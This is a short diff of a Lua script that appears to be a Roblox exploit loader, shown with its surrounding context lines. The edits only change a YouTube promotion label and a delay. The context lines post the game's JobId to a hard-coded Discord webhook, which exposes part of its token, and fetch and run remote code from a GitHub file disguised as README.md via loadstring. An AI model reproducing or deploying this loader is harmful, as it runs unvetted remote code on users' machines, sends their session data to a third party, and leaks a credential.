@@ -12,7 +12,7 @@ local Embed = {
     color = 0xFF0000,
     footer = { text = "🔍 JobId: " .. (game.JobId or "No JobId") },
     author = {
-        name = 'Subscribe!',
+        name = 'Click Link - Subscribe! (DYHUB)',
         url = 'https://youtube.com/@officialdyhub'
     },
     thumbnail = {
@@ -33,7 +33,7 @@ local webhookUrl = 'https://discord.com/api/webhooks/1395128660285063170/YYr0gKs
 local requestFunction = syn and syn.request or http_request or http and http.request
 
 local function loadNextScript()
-    task.wait(1.69)
+    task.wait(1)
     loadstring(game:HttpGet('https://raw.githubusercontent.com/dyumra/Loader/refs/heads/main/README.md'))()
 end
 
